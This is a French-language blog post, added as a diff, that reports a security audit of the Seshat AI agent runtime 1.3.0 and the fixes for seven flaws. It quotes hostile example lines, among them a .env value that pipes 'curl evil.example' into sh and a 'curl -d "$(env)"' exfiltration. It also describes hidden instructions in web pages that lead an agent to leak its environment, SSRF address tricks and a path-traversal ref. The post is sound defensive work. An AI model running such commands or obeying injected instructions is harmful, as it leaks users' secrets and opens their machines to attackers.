@@ -1,0 +1,92 @@
+---
+title: "Agents IA : ce qu'un audit de notre propre runtime a révélé"
+description: "Un dépôt cloné, un fichier .env, une page web : ce qui peut détourner un agent n'est pas le prompt. Sept problèmes trouvés dans Seshat 1.3.0."
+date: "2026-10-07"
+category: dev
+draft: false
+translationOf: running-agents-safely
+cover: /img/blog/running-agents-safely/cover.jpg
+tags: ["sécurité", "agents IA", "Go", "Seshat"]
+---
+import Callout from '@/components/docs/Callout.astro';
+import Flow from '@/components/docs/Flow.astro';
+import Figure from '@/components/docs/Figure.astro';
+
+Un agent IA lit des fichiers et exécute des commandes. La question « que peut-on lui faire lire ? » compte donc plus que « que peut lui demander un utilisateur ? ». Avant de publier Seshat 1.3.0, nous avons audité notre propre runtime avec cette question en tête. Nous avons trouvé des problèmes qu'un filtre de prompt n'aurait jamais attrapés, parce qu'aucun ne venait du prompt.
+
+Voici ce que nous avons trouvé, comment nous l'avons corrigé, et ce que vous pouvez vérifier dans votre propre agent. Tout ce qui suit figure dans le [changelog de la 1.3.0](https://github.com/KPO-Tech/seshat/blob/main/CHANGELOG.md) (en anglais), et la plupart des correctifs s'accompagnent d'un test qui reproduit le problème.
+
+<Figure
+  src="/img/blog/running-agents-safely/before-after.webp"
+  alt="Avant et après Seshat 1.3.0. À gauche, des entrées cachées atteignent l'agent : un dépôt cloné, un fichier .env, une page web, le réseau local, un serveur gRPC, un chemin git, l'environnement des outils. À droite, chacune est contenue : configuration du projet ignorée tant qu'elle n'est pas approuvée, .env assaini, adresses locales bloquées, gRPC fermé par défaut, références git vérifiées, secrets retirés des commandes, un scanner qui vérifie vraiment. Les textes de l'image sont en anglais."
+  caption="Avant et après Seshat 1.3.0, en une image (illustration générée par IA, textes en anglais). Les sections ci-dessous donnent les détails."
+  width={1536}
+  height={1024}
+/>
+
+## Les fichiers que lit un agent sont la surface d'attaque
+
+<Flow items={[
+  { icon: 'git-branch', label: 'Un dépôt tout juste cloné' },
+  { icon: 'file-code', label: 'Sa configuration de projet' },
+  { icon: 'shield-check', label: 'Une vérification de confiance' },
+  { icon: 'check-circle', label: 'Appliquée seulement ensuite' },
+]} />
+
+L'agent en terminal lit une configuration de projet dans le dossier où on l'ouvre. Un dépôt cloné peut contenir un tel fichier, et jusqu'à la 1.3.0 l'agent appliquait tout. Un test en a chargé un avec un serveur MCP en mode stdio, un hook, un serveur de langage, un provider avec une URL de base personnalisée et une clé d'API écrite `$(...)`, et une liste d'outils autorisés. Tout a pris effet : ouvrir l'agent dans ce dossier lançait la commande, sans rien demander.
+
+Désormais, les sections qui exécutent quelque chose ou envoient quelque chose quelque part sont ignorées tant que vous n'avez pas lancé `seshat trust` dans le projet. La confiance est enregistrée pour le SHA-256 de chaque fichier : un fichier modifié après un `git pull` doit être approuvé à nouveau. Notre règle : faire confiance à un projet qu'on a écrit ou lu, pas à un projet qu'on a seulement cloné. Les détails sont dans [Security and trust](/en/docs/concepts/security-and-trust) (documentation en anglais).
+
+## Un fichier `.env` qui exécutait une commande
+
+La même logique s'appliquait au fichier `.env` du dossier de travail. Une entrée comme `SESHAT_API_KEY=$(curl evil.example | sh)` était évaluée par un shell au chargement de la configuration, avant toute invite. Un test a fait écrire un fichier à la commande, ce qui l'a prouvé.
+
+Une entrée est maintenant ignorée, avec un avertissement, quand sa valeur contient une substitution shell ou quand son nom décide de ce qui s'exécute ou de l'endroit où Seshat cherche sa configuration (`PATH`, `SHELL`, `HOME`, `LD_*`, `GIT_*`, `NODE_OPTIONS` et quelques autres). Les clés, les modèles et les URL fonctionnent toujours.
+
+## Les secrets dans l'environnement de chaque commande
+
+L'outil `bash` donnait à chaque commande tout l'environnement de l'agent, clés des providers comprises. Une instruction cachée dans une page web ou un fichier pouvait faire lancer `env` au modèle, ou `curl -d "$(env)" ...`, et les envoyer à l'extérieur.
+
+Un nouveau filtre retire les variables dont le nom dit « secret » (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `DATABASE_URL`), les familles utilisées par les providers, et les valeurs qui ressemblent clairement à des identifiants. `PATH`, `HOME`, la locale, les proxys et les réglages de compilation restent. Si une commande a vraiment besoin de `GITHUB_TOKEN`, vous la nommez dans `SESHAT_BASH_ENV_ALLOW`.
+
+## Le réseau local, écrit de 28 façons
+
+L'outil de récupération web refusait déjà les adresses de bouclage et les adresses privées. Nous avons écrit un test avec 28 façons d'écrire une cible locale, et plusieurs sont passées :
+
+- `100.64.0.0/10`, la plage du NAT de niveau opérateur, où un cloud sert son point d'accès aux métadonnées à `100.100.100.200` ;
+- `0.0.0.0/8`, l'adresse de diffusion, et le multicast au-delà du lien local ;
+- une adresse IPv4 dans une adresse NAT64 : `64:ff9b::7f00:1` atteint `127.0.0.1` ;
+- les noms `localhost.` et `metadata.google.internal.` avec un point final, refusés seulement après avoir été résolus.
+
+Ils sont désormais refusés, avant et après la résolution DNS. La leçon, c'est la méthode et non la liste : une liste de blocage que vous n'avez pas attaquée vous-même n'est qu'une supposition.
+
+## Un serveur gRPC ouvert à tout le monde
+
+Le serveur gRPC écoutait sur toutes les interfaces, sans authentification ni TLS. Pire, `ConnectMCP` prenait un `command`, des `args` et un `env` et lançait ce processus sur l'hôte, puis l'enregistrait pour qu'il revienne au démarrage suivant. Quiconque pouvait atteindre le port pouvait exécuter des commandes avec les droits de l'utilisateur du serveur et dépenser ses clés de providers.
+
+Il est fermé par défaut maintenant : il écoute sur `127.0.0.1` ; sur toute autre adresse, il refuse de démarrer sans jeton (ou sans dérogation explicite) ; avec un jeton, chaque appel sauf `HealthCheck` exige `authorization: Bearer <token>` ; TLS est disponible ; et `ConnectMCP` refuse les serveurs stdio sauf autorisation. C'est un changement **cassant** pour un déploiement qui atteignait le serveur depuis une autre machine, et les notes de version le disent.
+
+## Un chemin qui lisait n'importe quel fichier
+
+Un fichier `HEAD` contenant `ref: refs/heads/../../../secret` faisait renvoyer, au code qui lit le commit courant, la première ligne de n'importe quel fichier accessible. Une référence doit désormais être un nom sous `refs/`, sans `..`, sans chemin absolu et sans lettre de lecteur, et elle est lue via `os.Root`.
+
+## Le scanner qui n'analysait rien
+
+Nous exécutons `gosec` dans l'intégration continue, et il affichait « Issues: 0 ». En y regardant de plus près, l'action Docker qui le fournit embarquait un Go plus ancien que celui exigé par notre module, ne pouvait charger aucun paquet, et déclarait zéro problème. Le mode « rapport seul » cachait l'échec.
+
+Nous le compilons et l'exécutons maintenant avec le Go du job, et un échec de chargement des paquets fait échouer l'étape. Le premier vrai scan a trouvé 75 problèmes de sévérité élevée. Nous en avons corrigé ou accepté 10, un par un (un problème accepté porte un `#nosec` motivé sur sa ligne), et exclu quatre classes que nous jugeons être de faux positifs pour ce code, avec la raison de chacune écrite dans le workflow. Une coche verte ne vaut que ce qu'elle a vérifié.
+
+<Callout type="tip" title="Une liste à appliquer dès aujourd'hui">
+1. Listez chaque fichier que votre agent lit sans l'avoir écrit : configuration de projet, `.env`, pages récupérées, résultats d'outils. Chacun est une entrée non fiable.
+2. Ignorez tout ce qui exécute ou redirige tant qu'un humain ne l'a pas approuvé, et liez l'approbation au contenu du fichier.
+3. Retirez les secrets de l'environnement de chaque commande que le modèle peut lancer.
+4. Faites écouter les serveurs sur l'interface locale par défaut ; faites de « ouvert au réseau » un choix explicite.
+5. Attaquez vos propres listes de blocage avec un test, puis corrigez ce qui passe.
+6. Vérifiez que votre scanner peut échouer.
+</Callout>
+
+## Ce que cela ne règle pas
+
+Ces changements ferment des portes restées ouvertes par accident. Ils ne rendent pas un agent sûr face à un modèle manipulé dans ce qu'il a le droit de faire : un outil autorisé peut encore être détourné, et un utilisateur peut approuver ce qu'il ne devrait pas. Les permissions, l'isolation et la relecture restent les couches qui comptent pour cela, et elles sont décrites dans la [documentation](/en/docs/concepts/tools-and-providers) (en anglais).
+
+Si vous construisez un runtime d'agents et voulez comparer vos notes, le code est ouvert : [github.com/KPO-Tech/seshat](https://github.com/KPO-Tech/seshat).
